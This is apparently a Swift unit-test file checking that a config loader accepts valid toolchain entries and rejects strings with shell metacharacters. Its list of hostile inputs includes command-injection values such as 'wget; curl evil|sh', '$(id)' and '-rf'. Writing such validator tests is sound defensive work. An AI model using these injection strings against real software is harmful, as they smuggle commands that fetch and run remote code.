import XCTest

@testable import KinhinKit

final class ToolchainEntryValidationTests: XCTestCase {
    private func parse(specs: [String]? = nil, brew: [String]? = nil, stacks: [String]? = nil) throws {
        var partial = PartialConfig.PartialToolchains()
        partial.specs = specs
        partial.brew = brew
        partial.stacks = stacks
        _ = try ConfigLoader.parseToolchains(partial)
    }

    func testRealisticEntriesAreAccepted() throws {
        try parse(
            specs: ["node@22", "ubi:owner/repo@1.2", "npm:@scope/pkg", "python@3.13", "go:github.com/a/b@~1.2"],
            brew: ["wget", "homebrew/cask/firefox", "foo@1.2"])
    }

    func testShellMetacharactersAreRejectedInEveryList() {
        let hostile = [
            "wget; curl evil|sh", "$(id)", "`id`", "a b", "x\ny", "a&&b", "a|b", "a>b", "'a'", "a\"b", "-rf",
        ]
        for entry in hostile {
            XCTAssertThrowsError(try parse(specs: [entry]), "specs: \(entry)")
            XCTAssertThrowsError(try parse(brew: [entry]), "brew: \(entry)")
            XCTAssertThrowsError(try parse(stacks: [entry]), "stacks: \(entry)")
        }
    }

    func testRejectionNamesTheKeyAndEntry() {
        XCTAssertThrowsError(try parse(brew: ["wget; id"])) { error in
            let message = (error as? LocalizedError)?.errorDescription ?? ""
            XCTAssertTrue(message.contains("toolchains.brew"), message)
            XCTAssertTrue(message.contains("wget; id"), message)
        }
    }
}
